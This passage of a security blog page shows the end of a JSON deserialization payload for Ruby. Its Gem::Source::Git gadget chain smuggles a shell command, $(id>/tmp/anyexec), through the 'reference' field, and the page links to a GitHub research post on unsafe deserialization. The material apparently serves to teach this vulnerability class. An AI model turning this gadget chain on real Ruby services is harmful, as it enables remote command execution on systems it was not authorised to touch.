    </span><span class="nl">"^o"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Gem::Resolver::GitSpecification"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"source"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
      </span><span class="nl">"^o"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Gem::Source::Git"</span><span class="p">,</span><span class="w">
      </span><span class="nl">"git"</span><span class="p">:</span><span class="w"> </span><span class="s2">"zip"</span><span class="p">,</span><span class="w">
      </span><span class="nl">"reference"</span><span class="p">:</span><span class="w"> </span><span class="s2">"-TmTT=</span><span class="se">\"</span><span class="s2">$(id&gt;/tmp/anyexec)</span><span class="se">\"</span><span class="s2">"</span><span class="p">,</span><span class="w">
      </span><span class="nl">"root_dir"</span><span class="p">:</span><span class="w"> </span><span class="s2">"/tmp"</span><span class="p">,</span><span class="w">
      </span><span class="nl">"repository"</span><span class="p">:</span><span class="w"> </span><span class="s2">"anyrepo"</span><span class="p">,</span><span class="w">
      </span><span class="nl">"name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"anyname"</span><span class="w">
    </span><span class="p">},</span><span class="w">
    </span><span class="nl">"spec"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
      </span><span class="nl">"^o"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Gem::Resolver::Specification"</span><span class="p">,</span><span class="w">
      </span><span class="nl">"name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"name"</span><span class="p">,</span><span class="w">
      </span><span class="nl">"dependencies"</span><span class="p">:</span><span class="w"> </span><span class="p">[]</span><span class="w">
    </span><span class="p">}</span><span class="w">
  </span><span class="p">}</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></code></pre></div></div> <p>Check for more details in the <a href="https://github.blog/security/vulnerability-research/execute-commands-by-sending-json-learn-how-unsafe-deserialization-vulnerabilities-work-in-ruby-projects/?utm_source=pocket_shared"><strong>original post</strong></a>.</p> </article> </div> </div> </div> </div> <footer class="sticky-bottom mt-5" role="contentinfo"> <div class="container"> &copy; Copyright 2025 47z!Lu7h . Love is life. And if you miss love, you miss life. </div> </footer> <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script> <script src="/assets/js/bootstrap.bundle.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/js/mdb.min.js" integrity="sha256-NdbiivsvWt7VYCt6hYNT3h/th9vSTL4EDWeGs5SN3DA=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/masonry-layout@4.2.2/dist/masonry.pkgd.min.js" integrity="sha256-Nn1q/fx0H7SNLZMQ5Hw5JLaTRZp0yILA/FRexe19VdI=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/imagesloaded@4/imagesloaded.pkgd.min.js"></script> <script defer src="/assets/js/masonry.js" type="text/javascript"></script> <script defer src="https://cdn.jsdelivr.net/npm/medium-zoom@1.1.0/dist/medium-zoom.min.js" integrity="sha256-ZgMyDAIYDYGxbcpJcfUnYwNevG/xi9OHKaR/8GK+jWc=" crossorigin="anonymous"></script> <script defer src="/assets/js/zoom.js?85ddb88934d28b74e78031fd54cf8308"></script> <script defer src="/assets/js/bootstrap-toc.min.js?c82ff4de8b0955d6ff14f5b05eed7eb6"></script> <script src="/assets/js/no_defer.js?2930004b8d7fcd0a8e00fdcfc8fc9f24"></script> <script defer src="/assets/js/common.js?4a129fbf39254905f505c7246e641eaf"></script> <script defer src="/assets/js/copy_code.js?12775fdf7f95e901d7119054556e495f" type="text/javascript"></script> <script async src="https://d1bxh8uas1mnw7.cloudfront.net/assets/embed.js"></script> <script async src="https://badge.dimensions.ai/badge.js"></script> <script type="text/javascript">window.MathJax={tex:{tags:"ams"}};</script> <script defer type="text/javascript" id="MathJax-script" src="https://cdn.jsdelivr.net/npm/mathjax@3.2.0/es5/tex-mml-chtml.js"></script> <script defer src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script> <script type="text/javascript">function progressBarSetup(){"max"in document.createElement("progress")?(initializeProgressElement(),$(document).on("scroll",function(){progressBar.attr({value:getCurrentScrollPosition()})}),$(window).on("resize",initializeProgressElement)):(resizeProgressBar(),$(document).on("scroll",resizeProgressBar),$(window).on("resize",resizeProgressBar))}function getCurrentScrollPosition(){return $(window).scrollTop()}function initializeProgressElement(){let e=$("#navbar").outerHeight(!0);$("body").css({"padding-top":e}),$("progress-container").css({"padding-top":e}),progressBar.css({top:e}),progressBar.attr({max:getDistanceToScroll(),value:getCurrentScrollPosition()})}function getDistanceToScroll(){return $(document).height()-$(window).height()}function resizeProgressBar(){progressBar.css({width:getWidthPercentage()+"%"})}function getWidthPercentage(){return getCurrentScrollPosition()/getDistanceToScroll()*100}const progressBar=$("#progress");window.onload=function(){setTimeout(progressBarSetup,50)};</script> </body> </html>